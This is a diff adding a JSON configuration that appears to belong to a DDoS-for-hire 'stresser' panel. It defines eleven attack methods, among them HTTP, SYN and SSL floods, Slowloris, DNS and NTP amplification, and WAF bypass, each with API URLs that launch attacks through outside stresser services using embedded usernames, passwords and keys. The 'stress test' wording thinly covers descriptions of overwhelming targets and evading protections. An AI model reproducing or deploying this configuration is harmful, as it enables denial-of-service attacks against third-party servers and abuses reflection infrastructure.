@@ -1,0 +1,172 @@
+[
+  {
+    "name": "HTTP Flood",
+    "type": "L7",
+    "desc": "Layer 7 HTTP flood attack simulation for stress testing endpoints. Sends a high volume of HTTP requests to overwhelm the target server.",
+    "tags": ["HTTP", "L7", "Flood"],
+    "vip": false,
+    "star": false,
+    "admin": false,
+    "ip": false,
+    "http": true,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-one.net/v2/attack?username=cortex&password=cx_pass_01&host=<host>&time=<time>&port=<port>&method=http-flood",
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=http-flood"
+    ]
+  },
+  {
+    "name": "UDP Bypass",
+    "type": "L4",
+    "desc": "UDP packet stress test for network layer performance analysis. Bypasses basic UDP protection mechanisms with crafted packet sequences.",
+    "tags": ["UDP", "L4", "Bypass"],
+    "vip": true,
+    "star": false,
+    "admin": false,
+    "ip": true,
+    "http": false,
+    "https": false,
+    "api_urls": [
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=udp-bypass",
+      "https://api.stresser-three.io/attack?key=cx_api_key_03&host=<host>&seconds=<time>&port=<port>&vector=udp-bypass"
+    ]
+  },
+  {
+    "name": "TCP SYN",
+    "type": "L4",
+    "desc": "TCP SYN stress test to evaluate server handshake capacity and saturate connection pools.",
+    "tags": ["TCP", "L4", "SYN"],
+    "vip": false,
+    "star": false,
+    "admin": false,
+    "ip": true,
+    "http": false,
+    "https": false,
+    "api_urls": [
+      "https://api.stresser-one.net/v2/attack?username=cortex&password=cx_pass_01&host=<host>&time=<time>&port=<port>&method=tcp-syn"
+    ]
+  },
+  {
+    "name": "Slowloris",
+    "type": "L7",
+    "desc": "Slow HTTP attack simulation to test connection pool limits by keeping many connections open with minimal data transfer.",
+    "tags": ["HTTP", "L7", "Slow"],
+    "vip": true,
+    "star": false,
+    "admin": false,
+    "ip": false,
+    "http": true,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=slowloris"
+    ]
+  },
+  {
+    "name": "DNS Amplify",
+    "type": "DNS",
+    "desc": "DNS amplification test for infrastructure load analysis using recursive resolver reflection to multiply traffic volume.",
+    "tags": ["DNS", "Amplify", "Reflection"],
+    "vip": true,
+    "star": true,
+    "admin": false,
+    "ip": true,
+    "http": false,
+    "https": false,
+    "api_urls": [
+      "https://api.stresser-three.io/attack?key=cx_api_key_03&host=<host>&seconds=<time>&port=<port>&vector=dns-amp",
+      "https://api.stresser-one.net/v2/attack?username=cortex&password=cx_pass_01&host=<host>&time=<time>&port=<port>&method=dns-amp"
+    ]
+  },
+  {
+    "name": "GET Flood",
+    "type": "L7",
+    "desc": "Simple GET request flood for basic stress testing scenarios. Effective against unprotected or lightly defended web servers.",
+    "tags": ["HTTP", "L7", "GET"],
+    "vip": false,
+    "star": false,
+    "admin": false,
+    "ip": false,
+    "http": true,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-one.net/v2/attack?username=cortex&password=cx_pass_01&host=<host>&time=<time>&port=<port>&method=get-flood"
+    ]
+  },
+  {
+    "name": "POST Spray",
+    "type": "L7",
+    "desc": "Distributed POST spray with randomized payloads targeting application-layer processing bottlenecks.",
+    "tags": ["HTTP", "L7", "POST"],
+    "vip": false,
+    "star": false,
+    "admin": false,
+    "ip": false,
+    "http": true,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-one.net/v2/attack?username=cortex&password=cx_pass_01&host=<host>&time=<time>&port=<port>&method=post-spray",
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=post-spray"
+    ]
+  },
+  {
+    "name": "ICMP Ping",
+    "type": "L3",
+    "desc": "ICMP echo request flood for latency and availability analysis at the network layer.",
+    "tags": ["ICMP", "L3", "Ping"],
+    "vip": false,
+    "star": false,
+    "admin": false,
+    "ip": true,
+    "http": false,
+    "https": false,
+    "api_urls": [
+      "https://api.stresser-three.io/attack?key=cx_api_key_03&host=<host>&seconds=<time>&port=<port>&vector=icmp"
+    ]
+  },
+  {
+    "name": "Bypass WAF",
+    "type": "L7",
+    "desc": "Advanced WAF evasion simulation for security assessment using rotating headers, user-agents and fragmented payloads.",
+    "tags": ["HTTP", "L7", "WAF", "Bypass"],
+    "vip": true,
+    "star": true,
+    "admin": false,
+    "ip": false,
+    "http": true,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=bypass-waf"
+    ]
+  },
+  {
+    "name": "SSL Flood",
+    "type": "L7",
+    "desc": "SSL/TLS handshake flood to evaluate crypto processing limits and measure certificate overhead under load.",
+    "tags": ["SSL", "TLS", "L7"],
+    "vip": true,
+    "star": false,
+    "admin": false,
+    "ip": false,
+    "http": false,
+    "https": true,
+    "api_urls": [
+      "https://api.stresser-two.net/v1/send?user=cortex_user&pass=cx_pass_02&target=<host>&duration=<time>&port=<port>&type=ssl-flood",
+      "https://api.stresser-three.io/attack?key=cx_api_key_03&host=<host>&seconds=<time>&port=<port>&vector=ssl-flood"
+    ]
+  },
+  {
+    "name": "NTP Amplify",
+    "type": "UDP",
+    "desc": "NTP amplification stress test for volumetric load simulation using monlist command reflection.",
+    "tags": ["NTP", "UDP", "Amplify"],
+    "vip": true,
+    "star": false,
+    "admin": true,
+    "ip": true,
+    "http": false,
+    "https": false,
+    "api_urls": [
+      "https://api.stresser-three.io/attack?key=cx_api_key_03&host=<host>&seconds=<time>&port=<port>&vector=ntp-amp"
+    ]
+  }
+]
